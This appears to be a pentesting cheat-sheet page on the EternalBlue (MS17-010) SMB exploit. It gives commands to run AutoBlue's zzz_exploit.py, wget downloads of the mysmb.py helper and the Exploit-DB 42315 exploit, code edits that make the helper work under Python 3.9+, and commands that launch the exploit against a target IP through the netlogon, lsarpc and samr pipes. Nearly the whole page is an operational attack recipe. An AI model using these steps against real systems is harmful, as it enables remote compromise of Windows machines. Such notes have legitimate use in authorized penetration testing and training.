---
title: EternalBlue
desc: Exploits Microsoft's SMB protocol. Also known as MS17-010.
tags: [SMB, Windows]
alts: [RapidTables]
website: https://github.com/3ndG4me/AutoBlue-MS17-010
render_with_liquid: false
---

## AutoBlue

```sh
# Basic
python zzz_exploit.py -target-ip 10.0.0.1 -port 445 'username:password@target'
```

<br />

## Manual Exploit

### 1. Download a required module named ‘mysmb.py’ and edit some codes for Python3.9+.

```sh
wget -O mysmb.py https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py


# ------ Edit in mysmb.py -----------------------------------------------

Line.69
# transData = b''
transData = ''

Line.73
# transData = ('\x00' * padLen) + str(parameters)
transData = "".join(map(chr,(b'\x00' * padLen))) + str(parameters)

Line.80
# transData += ('\x00' * padLen) + data
transData += "".join(map(chr,(b'\x00' * padLen))) + str(data)

Line.231
# req = str(pkt)
req = pkt.getData()
return b'\x00'*2 + pack('>H', len(req)) + req  # assume length is <6553

Line.381
# data += resp['Data'][1:]
data += resp['Data'][1:].decode()
```

### 2. Download an exploit via the Exploit-DB and edit credentials.

```sh
wget -O exploit.py https://www.exploit-db.com/exploits/42315


# ---- Edit in exploit.py ------------------

...
username = "username"
password = "password"
...

```

### 3.Run

```sh
python exploit.py 10.0.0.1 netlogon
python exploit.py 10.0.0.1 lsarpc
python exploit.py 10.0.0.1 samr
```